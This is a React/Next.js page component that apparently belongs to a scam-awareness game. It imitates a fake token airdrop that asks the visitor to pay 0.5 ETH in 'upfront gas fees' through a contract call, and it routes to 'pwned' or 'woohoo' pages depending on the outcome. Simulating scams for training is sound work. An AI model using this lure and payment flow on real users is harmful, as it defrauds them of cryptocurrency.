"use client";

import { bit, inter, poppins } from "@/app/utils/utils";
import { useAccount, useWriteContract } from "wagmi";
import {CONTRACT_ADDRESS, abi} from "@/constants/"
import { BaseError, parseEther } from "viem";
import { useRouter } from "next/navigation";
import { useEffect } from "react";

export default function Airdrop() {
  const {address} = useAccount()
  const {writeContractAsync, error, isSuccess} = useWriteContract() 
  const router = useRouter()

  useEffect(()=>{

    if(error){
      if((error as BaseError).shortMessage ="User rejected the request."){
  
        router.push("/woohoo?level=5")
      }


    }

  },[error])

  useEffect(()=>{
    isSuccess&&router.push("/pwned?level=5")

  }, [isSuccess])

  const sendTransaction = async()=>{
    try {
      await writeContractAsync({
        abi,
        address:CONTRACT_ADDRESS,
        functionName:"refund",
        value:parseEther("0.5")
      })

      
      
    } catch (e) {
      // console.log(e)
      
    }



  }








  return (
    <div className="text-white h-screen justify-center items-center pb-16  bg-[#11141a] pt-16 flex flex-col overflow-hidden relative">
      <div className="absolute inset-0 overflow-hidden">
        <svg
          viewBox="0 0  1510 3000"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
          className="w-full h-full opacity-60"
          preserveAspectRatio="xMidYMid slice"
        >
          <circle
            cx="750"
            cy="2250"
            r="749"
            transform="rotate(180 750 2250)"
            stroke="url(#paint0_linear_2661_6394)"
            strokeWidth="2"
          ></circle>
          <circle
            cx="750"
            cy="750"
            r="750"
            transform="matrix(-1 0 0 1 1509 1)"
            stroke="url(#paint1_linear_2661_6394)"
            strokeWidth="2"
          ></circle>
          <circle
            opacity="0.5"
            cx="700"
            cy="700"
            r="700"
            transform="matrix(-1 0 0 1 1459 101)"
            stroke="url(#paint2_linear_2661_6394)"
            strokeWidth="2"
          ></circle>
          <circle
            opacity="0.2"
            cx="759"
            cy="851"
            r="650"
            stroke="url(#paint3_linear_2661_6394)"
            strokeWidth="2"
          ></circle>
          <defs>
            <linearGradient
              id="paint0_linear_2661_6394"
              x1="750"
              y1="1501"
              x2="750"
              y2="2999"
              gradientUnits="userSpaceOnUse"
            >
              <stop offset="0.5" stopColor="#1755F4" stopOpacity="0"></stop>
              <stop offset="0.7" stopColor="#1755F4"></stop>
              <stop offset="0.8" stopColor="#DA393C"></stop>
              <stop offset="1" stopColor="#FFD923"></stop>
            </linearGradient>
            <linearGradient
              id="paint1_linear_2661_6394"
              x1="750"
              y1="0"
              x2="750"
              y2="1500"
              gradientUnits="userSpaceOnUse"
            >
              <stop offset="0.5" stopColor="#1755F4" stopOpacity="0"></stop>
              <stop offset="0.7" stopColor="#1755F4"></stop>
              <stop offset="0.8" stopColor="#DA393C"></stop>
              <stop offset="1" stopColor="#FFD923"></stop>
            </linearGradient>
            <linearGradient
              id="paint2_linear_2661_6394"
              x1="700"
              y1="0"
              x2="700"
              y2="1400"
              gradientUnits="userSpaceOnUse"
            >
              <stop offset="0.5" stopColor="#1755F4" stopOpacity="0"></stop>
              <stop offset="0.7" stopColor="#1755F4"></stop>
              <stop offset="0.8" stopColor="#8A39DA"></stop>
              <stop offset="1" stopColor="#23F2FF"></stop>
            </linearGradient>
            <linearGradient
              id="paint3_linear_2661_6394"
              x1="759"
              y1="201"
              x2="759"
              y2="1501"
              gradientUnits="userSpaceOnUse"
            >
              <stop offset="0.5" stopColor="#1755F4" stopOpacity="0"></stop>
              <stop offset="0.7" stopColor="#1755F4"></stop>
              <stop offset="0.8" stopColor="#35FF49"></stop>
              <stop offset="1" stopColor="#2361FF"></stop>
            </linearGradient>
          </defs>
        </svg>
      </div>

      <div className={"text-3xl font-semibold  z-10 " + poppins.className}>
        Introducing the GK token
      </div>
      <div
        className={"text-5xl text-center font-extrabold z-20 tracking-wide w-[60rem] mt-10 " + poppins.className}
      >
        Join the mission to govern, protect and grow the GKsync protocol
      </div>
      <div className="mt-10 bg-[#dadde5] h-56 z-10 w-[50rem] rounded-[3rem] p-7 flex flex-col gap-4 justify-center items-center ">
        <div
          className={"text-xl text-center flex text-black " + inter.className}
        >
          Congratulations! You are eligible for the airdrop. You will
          have to pay 0.5 ETH as upfront gas fees and once you've done that,
          tokens will be airdropped to you.
        </div>
        <button
        onClick={sendTransaction}
          className={
            "bg-yellow-500 w-[30rem] z-[999999] h-10 px-4 py-2 rounded-3xl hover:bg-yellow-700 hover:cursor-pointer transition-all " +
            bit.className
          }
        >
          Pay 0.5 ETH
        </button>
      </div>
    </div>
  );
}
